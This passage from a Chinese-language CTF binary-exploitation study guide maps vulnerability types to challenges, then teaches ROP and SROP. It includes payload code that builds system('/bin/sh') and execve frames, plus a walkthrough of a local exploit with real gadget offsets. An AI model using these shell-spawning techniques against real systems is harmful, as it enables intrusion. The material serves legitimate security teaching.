{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
類型
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
長相
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
本系列出現
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{Stack Buffer Overflow} &
\texttt{char\ \allowbreak{}buf{[}64{]};\ \allowbreak{}read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}1024);} &
pwn1、pwn5（\texttt{state} 陣列就在堆疊上）、pwn7 \\
\textbf{Format String} & \texttt{printf(buf);}（把輸入當格式字串） &
pwn2（用 glibc 的 printf）、pwn3（\textbf{自製}的 printf） \\
\textbf{Integer / Signedness} & \texttt{if\ \allowbreak{}(idx\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}15)}
但 \texttt{idx} 是有號 → 負索引越界 & pwn7 \\
\textbf{Heap Overflow / UAF} & \texttt{malloc} 系列操作錯誤（free
後指標還能用 / 同一塊 free 兩次） & pwn4（UAF + tcache
poisoning）、pwn6（refcount 算錯 → double free + UAF） \\
\textbf{Reference count bug} & 引用計數算錯 → 同一塊 chunk 被
\texttt{free()} 兩次 & pwn6 \\
\textbf{Missing bounds check} & 長度沒檢查就
\texttt{memcpy(dst,\allowbreak{}\ \allowbreak{}src,\allowbreak{}\ \allowbreak{}len)} & （本系列沒有直接例子：pwn3 是
\texttt{va\_\allowbreak{}list}、pwn6 是 refcount） \\
\textbf{Logic bug} & 程式邏輯本身有洞（迴圈上界、簽章檢查\ldots） &
pwn5（off-by-one）、pwn6（refcount） \\
\textbf{Uninitialised memory} & 沒初始化就讀 → 洩漏堆疊 &
（本系列沒有；pwn6 是候選但已被短讀檢查排除） \\
\end{longtable}
}

\begin{quote}
※提示 \textbf{heap 題（pwn4 \texttt{cache\_\allowbreak{}money}、pwn6
\texttt{code\_\allowbreak{}breaker}）的入門路徑}：本檔不含 heap 章節。 請\textbf{先讀
\texttt{../\allowbreak{}pwn4/\allowbreak{}notes.\allowbreak{}md} §5.1～§5.4}（從零講：chunk 長什麼樣 → free
之後發生什麼事 → tcache → safe-linking 想防什麼；有 ASCII 圖與
gdb／實測數字）。 讀完再把 \texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md} §8
當\textbf{速查表}查（它開頭有「入門三句話」與各名詞的一句話解釋）；
\texttt{../\allowbreak{}pwn6/\allowbreak{}notes.\allowbreak{}md} §3.5 也有一份 20 行的最小語彙整理。
\end{quote}

\begin{quote}
※注意 \textbf{「哪一題算哪一類」請以各題的 \texttt{notes.\allowbreak{}md}
為準，不要相信題目提示}： 提示有時是故意放的餌 ------ pwn3
提示的「\texttt{.\allowbreak{}bss} 長度整數溢位 + \texttt{memcpy}」與 pwn5
的「命令注入」\textbf{都是假的}（詳見本檔附錄的對照表旁註）。
\end{quote}

\paragraph{9.1 Stack Overflow
的辨識方法}\label{stack-overflow-ux7684ux8fa8ux8b58ux65b9ux6cd5}

看到 \texttt{read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}很大)} 或 \texttt{gets(buf)} 或
\texttt{strcpy} 到固定大小陣列 → 可疑。

\paragraph{9.2 Format String
的辨識方法}\label{format-string-ux7684ux8fa8ux8b58ux65b9ux6cd5}

看到 \texttt{printf(buf)}（只有一個參數、且是使用者控制的緩衝區）→
\textbf{一定是漏洞}。 詳見 \texttt{../\allowbreak{}pwn2/\allowbreak{}notes.\allowbreak{}md}（有完整的
\texttt{\%\allowbreak{}p} / \texttt{\%\allowbreak{}n} 教學）。

還有一種變體：\textbf{題目自己寫了一台「格式化小引擎」}（支援
\texttt{\%\allowbreak{}1\$\allowbreak{}p}、\texttt{\%\allowbreak{}14\$\allowbreak{}s} 這種寫法），
此時漏洞往往在它怎麼初始化可變參數區（\texttt{va\_\allowbreak{}list}）→ 見
\texttt{../\allowbreak{}pwn3/\allowbreak{}notes.\allowbreak{}md}。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10. ROP 從零開始}\label{rop-ux5f9eux96f6ux958bux59cb}

\paragraph{10.1 問題}\label{ux554fux984c}

假設我們有 stack overflow，可以把返回位址蓋成任意值。 但我們想執行
\texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}，需要 \texttt{rdi\ \allowbreak{}=\ \allowbreak{}\&\allowbreak{}"/\allowbreak{}bin/\allowbreak{}sh"}。
我們能「跳」到任何位址，但\textbf{沒辦法設定暫存器}。

\paragraph{10.2 解法：gadget}\label{ux89e3ux6cd5gadget}

\begin{quote}
以下出現的
\texttt{0x401234}、\texttt{BINSH\_\allowbreak{}ADDR}、\texttt{SYSTEM\_\allowbreak{}ADDR}、\texttt{POP\_\allowbreak{}RDI}、\texttt{RET}
都是\textbf{佔位符（假位址）}， 你要用 \texttt{ROPgadget} /
\texttt{readelf} / pwntools 從\textbf{自己題目的 binary}
找出真正的位址再填進去。 直接照抄下面的數字當成真位址一定失敗。
\end{quote}

程式碼裡散落著很多「以 \texttt{ret} 結尾」的小片段，例如：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401234:  }\BuiltInTok{pop} \KeywordTok{rdi}
\NormalTok{401235:  }\ControlFlowTok{ret}
\end{Highlighting}
\end{Shaded}

如果我們把返回位址蓋成 \texttt{0x401234}，會發生：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
ret          →  rip = 0x401234, rsp → 下一個 qword
pop rdi      →  rdi = [rsp]（我們控制的值！）, rsp += 8
ret          →  rip = [rsp]（我們控制的下一個位址）, rsp += 8
\end{Verbatim}

\textbf{所以堆疊就變成了「指令序列」}。這就叫 ROP（Return-Oriented
Programming）。

\paragraph{\texorpdfstring{10.3 組出
\texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}}{10.3 組出 system("/bin/sh")}}\label{ux7d44ux51fa-systembinsh}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload  }\OperatorTok{=} \StringTok{b"A"} \OperatorTok{*}\NormalTok{ offset}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RDI)      }\CommentTok{\# pop rdi ; ret}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(BINSH\_ADDR)   }\CommentTok{\# rdi = "/bin/sh"}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(RET)          }\CommentTok{\# 可選：對齊用的 ret}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(SYSTEM\_ADDR)  }\CommentTok{\# 跳去 system}
\end{Highlighting}
\end{Shaded}

執行起來就像：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{pop} \KeywordTok{rdi} \CommentTok{; ret}
\NormalTok{"/bin}\OperatorTok{/}\NormalTok{sh}\StringTok{"}
\ControlFlowTok{ret}            \OperatorTok{(}\NormalTok{對齊用}\OperatorTok{)}
\NormalTok{system}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{10.4 為什麼有時候要多插一個
\texttt{ret}（16-byte
對齊）}{10.4 為什麼有時候要多插一個 ret（16-byte 對齊）}}\label{ux70baux4ec0ux9ebcux6709ux6642ux5019ux8981ux591aux63d2ux4e00ux500b-ret16-byte-ux5c0dux9f4a}

\texttt{system()} 內部會用到 SSE 指令（例如 \texttt{movaps}），而
\texttt{movaps} \textbf{要求記憶體位址 16-byte 對齊}。 ABI
的規定是：\textbf{\texttt{call} 執行前
\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0}}；換句話說，\textbf{被呼叫的函式開始執行第一道指令時，
\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8}}（因為 \texttt{call} 剛壓了 8 bytes
的返回位址）。

用 ROP 時我們是用 \texttt{ret} 跳進
\texttt{system}，所以要看的是「\textbf{\texttt{system} 第一道指令執行時
\texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8}}」， 不對就會在 \texttt{movaps} 的地方
SIGSEGV。多插一個只有 \texttt{ret} 的 gadget 會讓 \texttt{rsp} 多走 8
bytes， 剛好把奇偶性調過來 ------ 這就是那個「對齊用
\texttt{ret}」的作用。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RDI) }\OperatorTok{+}\NormalTok{ p64(BINSH) }\OperatorTok{+}\NormalTok{ p64(RET) }\OperatorTok{+}\NormalTok{ p64(SYSTEM)}
                                                  \OperatorTok{\^{}\^{}\^{}\^{}}\NormalTok{ 就是對齊用的}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※提示 這個對齊用的 \texttt{ret} 放在鏈的哪裡都可以（\texttt{pop\ \allowbreak{}rdi}
之前或 \texttt{system} 之前都行）， 重點是「整條鏈在 \texttt{rsp}
上總共多走 8 bytes」。
\end{quote}

\paragraph{10.5 常見 gadget}\label{ux5e38ux898b-gadget}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
gadget & 效果 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{pop\ \allowbreak{}rdi\ \allowbreak{};\ \allowbreak{}ret} & 設定第 1 個參數 \\
\texttt{pop\ \allowbreak{}rsi\ \allowbreak{};\ \allowbreak{}ret} & 設定第 2 個參數 \\
\texttt{pop\ \allowbreak{}rdx\ \allowbreak{};\ \allowbreak{}ret} & 設定第 3 個參數 \\
\texttt{pop\ \allowbreak{}rax\ \allowbreak{};\ \allowbreak{}ret} & 設定系統呼叫編號 \\
\texttt{syscall\ \allowbreak{};\ \allowbreak{}ret} & 下 syscall \\
\texttt{ret} & 對齊 / 跳過 \\
\texttt{leave\ \allowbreak{};\ \allowbreak{}ret} & stack pivot（把 rsp 搬到 rbp） \\
\texttt{pop\ \allowbreak{}rsp\ \allowbreak{};\ \allowbreak{}...\allowbreak{}\ \allowbreak{};\ \allowbreak{}ret} & 直接把 rsp 設成指定值（pwn7
用到） \\
\end{longtable}
}

\paragraph{10.6 Stack Pivot}\label{stack-pivot}

當堆疊上放不下太長的 ROP 鏈時，可以把 \texttt{rsp} 搬到 \texttt{.\allowbreak{}bss}
（已知位址、可寫、空間大）再繼續接鏈。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RSP) }\OperatorTok{+}\NormalTok{ p64(BSS\_TARGET)   }\CommentTok{\# rsp = BSS\_TARGET}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{10.7 如果沒有 \texttt{pop\ \allowbreak{}rdi}
怎麼辦？}{10.7 如果沒有 pop rdi 怎麼辦？}}\label{ux5982ux679cux6c92ux6709-pop-rdi-ux600eux9ebcux8fa6}

\begin{itemize}
\tightlist
\item
  找 \texttt{mov\ \allowbreak{}rdi,\allowbreak{}\ \allowbreak{}...;\ \allowbreak{}call\ \allowbreak{}...} 之類的片段（見下面「ret2csu」）
\item
  找 \texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}pop\ \allowbreak{}rXX;\ \allowbreak{}ret} 之類「多 pop
  幾個」的變體，多的值填垃圾
\item
  \textbf{或者用 SROP}（下一節）
\end{itemize}

\begin{quote}
※提示 \textbf{\texttt{ret2csu} 是什麼}：編譯器在程式裡會留下一個
\texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}csu\_\allowbreak{}init}（libc 的初始化函式）， 它裡面有兩段很好用的
gadget（一段負責 pop 一堆暫存器、一段負責 \texttt{call}），
合起來可以\textbf{一次設定 \texttt{rdi} / \texttt{rsi} /
\texttt{rdx}}，而且不需要 libc。 當程式裡找不到乾淨的
\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} 時，這就是替代方案。
\end{quote}

\paragraph{10.8 動手做一次：你人生第一條 ROP 鏈（用 pwn5 當教材，5
分鐘）}\label{ux52d5ux624bux505aux4e00ux6b21ux4f60ux4ebaux751fux7b2cux4e00ux689d-rop-ux93c8ux7528-pwn5-ux7576ux6559ux67505-ux5206ux9418}

不需要先看懂 pwn5 的漏洞。跟著跑，你會看到「堆疊真的變成一張指令清單」：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ pwn5}
\ExtensionTok{python3}\NormalTok{ exploit.py         }\CommentTok{\# 本機，會印出 canary / saved rbp / PIE base，最後拿到 flag}
\end{Highlighting}
\end{Shaded}

實際輸出（節錄，每次執行的隨機值都不同）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[+] canary    = 0x4cef3d7131e99900
[+] saved rbp = 0x7ffda2ccc360
[+] PIE base  = 0x564a62832000
sun{LOCAL_DUMMY_FLAG}
FLAG: sun{LOCAL_DUMMY_FLAG}
\end{Verbatim}

它整條鏈就是本節教的全部（\texttt{pwn5/\allowbreak{}exploit.\allowbreak{}py} 的 \texttt{OFF\_\allowbreak{}*}
常數，位址都經過驗證）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{pop\_rdi }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x12aa}      \CommentTok{\# §10.2 的 gadget：pop rdi; ret}
\NormalTok{binsh   }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x4a54}      \CommentTok{\# §10.3 的參數：我們自己寫進 .bss 的 "/bin/sh" 字串}
\NormalTok{system  }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x10c0}      \CommentTok{\# §10.3 的目標：system@plt}
\NormalTok{ret     }\OperatorTok{=}\NormalTok{ pie }\OperatorTok{+} \BaseNTok{0x101a}      \CommentTok{\# §10.4 的對齊用 ret（一個乾淨的 ret 指令）}

\NormalTok{chain }\OperatorTok{=}\NormalTok{ [pop\_rdi, binsh, system, }\DecValTok{0}\NormalTok{]      }\CommentTok{\# 最小鏈；最後的 0 是 system 的回傳位址}
\ControlFlowTok{if}\NormalTok{ (saved\_rbp }\OperatorTok{+} \BaseNTok{0x10}\NormalTok{) }\OperatorTok{\%} \DecValTok{16} \OperatorTok{==} \DecValTok{0}\NormalTok{:         }\CommentTok{\# §10.4：需要對齊時在最前面補一個 ret}
\NormalTok{    chain }\OperatorTok{=}\NormalTok{ [ret] }\OperatorTok{+}\NormalTok{ chain}
\end{Highlighting}
\end{Shaded}

\textbf{那行程式到底是怎麼來的？（§10.4 只說「多走 8
bytes」，這裡把它算出來）}

第一步：先看「\textbf{\texttt{system} 要執行第一道指令時，\texttt{rsp}
會停在哪一格}」。把堆疊畫出來 （\texttt{R} 就是我們洩漏到的
\texttt{saved\_\allowbreak{}rbp}，\textbf{它同時是「那個 rbp 格子自己的位址」}：
x86-64 的框指標鏈讓 \texttt{{[}rbp{]}}
存的值＝上一層框指標＝這一格的位址）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 位址        內容                       誰會讀走這一格
 ────────────────────────────────────────────────────────────────────────────
 R          ← 「被覆寫的那格 rbp」        leave 的 pop rbp
 R+0x08     ← 返回位址（= chain 的第 1 格） leave 最後的那個 ret（第一次 ret）
 R+0x10     ← pop_rdi gadget          ←── 第一次 ret 之後 rsp 指到這裡（＝鏈的起點）
 R+0x18     ← "/bin/sh" 的位址            pop rdi 吃掉它（rsp → R+0x18）
 R+0x20     ← system 的位址               第二個 ret 吃掉它 → 跳進 system，rsp → R+0x20
\end{Verbatim}

⇒ \textbf{進 \texttt{system} 的那一刻
\texttt{rsp\ \allowbreak{}=\ \allowbreak{}R\ \allowbreak{}+\ \allowbreak{}0x20}}（因為「\texttt{system} 眼中的返回位址」就是
\texttt{R+0x20} 那格）。

第二步：對照 ABI 的要求（SysV AMD64，§10.4 已寫過）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 `call` 指令執行時        rsp % 16 == 0
 call 壓入 8 bytes 返回位址
 被呼叫的函式第一道指令    rsp % 16 == 8      ← ✶ 我們要讓 system 看到這個
\end{Verbatim}

第三步：把兩件事合起來解方程式：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 需要： (R + 0x20) % 16 == 8
 等價於： R % 16 == 8          （因為 0x20 = 32 是 16 的倍數）
 等價於： (R + 0x10) % 16 == 0 （0x10 = 16 也是 16 的倍數）
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  若 \texttt{(R+0x10)\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0} → \texttt{R\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0} → 進
  \texttt{system} 時 \texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0} ✗ \textbf{差 8} →
  補一個 \texttt{ret}
\item
  若 \texttt{(R+0x10)\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8} → \texttt{R\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8} → 進
  \texttt{system} 時 \texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8} ✓ 不用補
\end{itemize}

\textbf{為什麼「只含一個 \texttt{ret}」的 gadget 就能修好？} 因為
\texttt{ret} 只做兩件事：
\texttt{pop\ \allowbreak{}rip}（讀一格、\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8}）→
跳到那格寫的位址。所以它\textbf{只讓 \texttt{rsp} 多前進 8 bytes、
不改任何暫存器、也不影響鏈的語意} ------ 而 \texttt{rsp} 只差「8
的奇偶性」，走一格剛好翻面。 （放在 \texttt{pop\ \allowbreak{}rdi} 前面或
\texttt{system} 前面都行，重點是整條鏈在 \texttt{rsp} 上總共多走 8
bytes。）

\begin{quote}
※實測 \textbf{實測（兩件事都量過）} ① ABI
那一半：對函式\textbf{入口}設精確中斷點（\texttt{b\ \allowbreak{}*probe}）再讀
\texttt{rsp}（位址隨 ASLR 變動， 看 \texttt{\&\allowbreak{}\ \allowbreak{}0xf} 就好）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
Breakpoint 2, 0x0000555555555119 in probe ()
$2 = 0x7fffffffde48          →  0x48 & 0xf = 8   ✓ 進函式時 rsp % 16 == 8
\end{Verbatim}

（※注意 一定要用 \texttt{b\ \allowbreak{}*probe}
這種「\textbf{帶星號的位址}」寫法。用 \texttt{b\ \allowbreak{}probe} 的話 gdb
會\textbf{跳過序言}， 停在第 2 道指令 ------ 那時 \texttt{push\ \allowbreak{}rbp}
已經執行完，\texttt{rsp} 少了 8，實測會得到 \texttt{\%\allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0}，
會讓你以為 ABI 講錯了。） ② 本題那一半：把 \texttt{pwn5/\allowbreak{}exploit.\allowbreak{}py} 的
\texttt{if\ \allowbreak{}(saved\_\allowbreak{}rbp\ \allowbreak{}+\ \allowbreak{}0x10)\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}0:} 改成
\texttt{if\ \allowbreak{}False:} （= 故意不補 \texttt{ret}）再跑：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[+] saved rbp = 0x7ffd590f6c60        ← 0x60+0x10 = 0x70，0x70 % 16 == 0 → 本題確實「需要補」
[*] Process './homemaker' stopped with exit code -11 (SIGSEGV)   ← 少了 ret：死在 system 的 movaps
FLAG: <not found in output>
\end{Verbatim}

補回那行 \texttt{ret}
立刻恢復：\texttt{FLAG:\allowbreak{}\ \allowbreak{}sun\{\allowbreak{}LOCAL\_\allowbreak{}DUMMY\_\allowbreak{}FLAG\}\allowbreak{}}。（\texttt{pwn5/\allowbreak{}notes.\allowbreak{}md}
§6.3 有同一件事的 gdb 版追蹤。）
\end{quote}

\begin{quote}
※提示 \textbf{不想推導也可以}：在 gdb 裡對 \texttt{system}
的第一道指令下中斷點，直接看 \texttt{p\ \allowbreak{}\$\allowbreak{}rsp\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf} 是不是
\texttt{8}（見 \texttt{wp/\allowbreak{}99\_\allowbreak{}速查表.\allowbreak{}md} §12
的症狀表）。\textbf{算式只是讓你還不知道會不會炸時就能先判斷。}
\end{quote}

想自己找那個 gadget（實測可跑）：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{ROPgadget} \AttributeTok{{-}{-}binary}\NormalTok{ pwn5/homemaker }\KeywordTok{|} \FunctionTok{grep} \AttributeTok{{-}E} \StringTok{": pop rdi ; ret$"}
\CommentTok{\# 0x00000000000012aa : pop rdi ; ret}
\end{Highlighting}
\end{Shaded}

\textbf{\texttt{ret} 是怎麼「一格一格」吃掉堆疊的？} 這張表是 ROP
的核心心智模型：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
步驟
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
執行到
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
這一步做什麼
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0 & \texttt{leave} & \texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp} → \texttt{pop\ \allowbreak{}rbp} →
\texttt{rsp\ \allowbreak{}=\ \allowbreak{}rbp+8} \\
1 & 第一個 \texttt{ret} & 彈 \texttt{{[}rbp+8{]}} 進 \texttt{rip} →
跳到我們蓋上去的位址（\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8}） \\
2 & \texttt{pop\ \allowbreak{}rdi} &
\texttt{rdi\ \allowbreak{}=\ \allowbreak{}{[}rsp{]}}（我們放的參數），\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8} \\
3 & 第二個 \texttt{ret} & 彈 \texttt{{[}rsp{]}} 進 \texttt{rip} →
這次跳進 \texttt{system} \\
4 & \texttt{system} 第一道指令 & \texttt{rsp}
指到鏈的下一格（\texttt{system} 的回傳位址） \\
\end{longtable}
}

\begin{quote}
※提示 看懂這張表就懂了 ROP：\textbf{「堆疊＝一張指令清單，每個
\texttt{ret} 讀一格、跳到那格寫的位址」}。 排 payload 時只要問兩件事：①
這個 gadget 會從 \texttt{rsp} 讀幾格？ ②
我現在寫的這一格，\textbf{在記憶體裡的位址}對不對？

pwn5 的 \texttt{notes.\allowbreak{}md} §6.3.1 有一份「每一格實際 \texttt{rsp} 值」的
gdb 實測表，可以對照著看。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{11. SROP}\label{srop}

\paragraph{11.1 動機}\label{ux52d5ux6a5f}

Linux 處理 signal 時，核心會把\textbf{完整的 CPU 狀態} （所有通用暫存器
+ \texttt{rip} + \texttt{rsp} + flags + signal mask\ldots） 打包成一個
\textbf{\texttt{rt\_\allowbreak{}sigframe}} 放在使用者堆疊上，然後跳到 signal
handler。 handler 結束呼叫 \texttt{rt\_\allowbreak{}sigreturn}（syscall 15），
核心再把那包東西\textbf{整包還原}回去。

\textbf{核心完全信任堆疊上的那份 frame。}

\paragraph{11.2 攻擊}\label{ux653bux64ca}

如果我們能： 1. 控制堆疊內容（偽造 \texttt{rt\_\allowbreak{}sigframe}） 2. 讓
\texttt{rax\ \allowbreak{}=\ \allowbreak{}15} 3. 執行 \texttt{syscall}

那核心就會幫我們\textbf{一次設定所有暫存器}。

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
偽造 frame:
   rax = 59            (__NR_execve)
   rdi = &"/bin/sh"
   rsi = 0
   rdx = 0
   rip = <某個 syscall 指令的位址>
   rsp = <某個合法位址>
\end{Verbatim}

還原之後執行到 \texttt{rip} → \texttt{syscall} 帶 \texttt{rax=59} →
\texttt{execve("/\allowbreak{}bin/\allowbreak{}sh")} → shell ※完成

\paragraph{\texorpdfstring{11.3 怎麼讓
\texttt{rax\ \allowbreak{}=\ \allowbreak{}15}}{11.3 怎麼讓 rax = 15}}\label{ux600eux9ebcux8b93-rax-15}

最常見兩招：

\textbf{a) 用 \texttt{read} 的回傳值} \texttt{read()} 的回傳值 =
實際讀到的 byte 數，而 syscall 的回傳值就在 \texttt{rax}。 → 只要讓那次
\texttt{read()} 恰好回傳 15 bytes。\textbf{（pwn1 用這招）}

\textbf{b) 用 \texttt{pop\ \allowbreak{}rax\ \allowbreak{};\ \allowbreak{}ret}}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(POP\_RAX) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{15}\NormalTok{) }\OperatorTok{+}\NormalTok{ p64(SYSCALL\_RET)}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{11.4 pwntools 的
\texttt{SigreturnFrame}}{11.4 pwntools 的 SigreturnFrame}}\label{pwntools-ux7684-sigreturnframe}

\begin{quote}
※注意 用 \texttt{SigreturnFrame()} 之前一定要先設
\texttt{context.\allowbreak{}arch\ \allowbreak{}=\ \allowbreak{}\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{}} （或
\texttt{context.\allowbreak{}clear(arch=\textquotesingle{}\allowbreak{}amd64\textquotesingle{}\allowbreak{})}），否則
pwntools 會直接報
\texttt{{[}ERROR{]}\ \allowbreak{}kernel\ \allowbreak{}architecture\ \allowbreak{}must\ \allowbreak{}be\ \allowbreak{}specified}。
這也是兩支 exploit 開頭都有那行的原因。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{frame }\OperatorTok{=}\NormalTok{ SigreturnFrame()}
\NormalTok{frame.rax }\OperatorTok{=} \DecValTok{59}
\NormalTok{frame.rdi }\OperatorTok{=}\NormalTok{ binsh\_addr}
\NormalTok{frame.rsi }\OperatorTok{=} \DecValTok{0}
\NormalTok{frame.rdx }\OperatorTok{=} \DecValTok{0}
\NormalTok{frame.rip }\OperatorTok{=}\NormalTok{ syscall\_ret\_addr}
\NormalTok{frame.rsp }\OperatorTok{=}\NormalTok{ some\_valid\_addr}
\NormalTok{payload }\OperatorTok{+=} \BuiltInTok{bytes}\NormalTok{(frame)}
\end{Highlighting}
\end{Shaded}

這裡有三個名字很容易混，先記這張表（完整版與實測位址見
\texttt{../\allowbreak{}pwn1/\allowbreak{}notes.\allowbreak{}md} §5.1、§5.3）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
名字
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
是什麼
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{rt\_\allowbreak{}sigframe} & 核心處理 signal
時，放在使用者堆疊上的「\textbf{整包}」結構 ------
裡面\textbf{除了暫存器，還包含
\texttt{pretcode}、\texttt{siginfo}（信號資訊，\texttt{0x80}
bytes）、\texttt{ucontext}，以及後面接的 FPU/xsave
狀態}。所以它\textbf{比 \texttt{0xf8}
大得多}（本機實測：核心為了放這包，把 \texttt{rsp} 往下移了約
\texttt{0x6a8} bytes；這個數字隨 CPU 的 xsave 大小與對齊而變） \\
\texttt{ucontext} & 這包裡的一段（開頭是 \texttt{uc\_\allowbreak{}flags} /
\texttt{uc\_\allowbreak{}link} / \texttt{uc\_\allowbreak{}stack}，共 \texttt{0x28} bytes） \\
\texttt{struct\ \allowbreak{}sigcontext} & 緊接在 \texttt{ucontext}
後面、真正存「所有暫存器」的那一段 ------ \textbf{\texttt{r8} 從 offset
\texttt{0x28} 開始} \\
\texttt{SigreturnFrame()} & pwntools 產生的
\textbf{\texttt{0xf8}（248）bytes}；\textbf{它就是我們要塞上堆疊的東西} \\
\end{longtable}
}

\begin{quote}
※注意 \textbf{\texttt{0xf8} 是「pwntools 那個
frame」的長度，不是核心那個結構的長度。} 核心真正壓上去的
\texttt{rt\_\allowbreak{}sigframe} 大得多（還含 \texttt{siginfo}、FPU 狀態\ldots）。
但對解題\textbf{只有一件事重要}：\textbf{你寫在 \texttt{rsp} 上的 bytes
必須排得像 pwntools 的 frame}， 而那剛好是 \texttt{0xf8} bytes ------
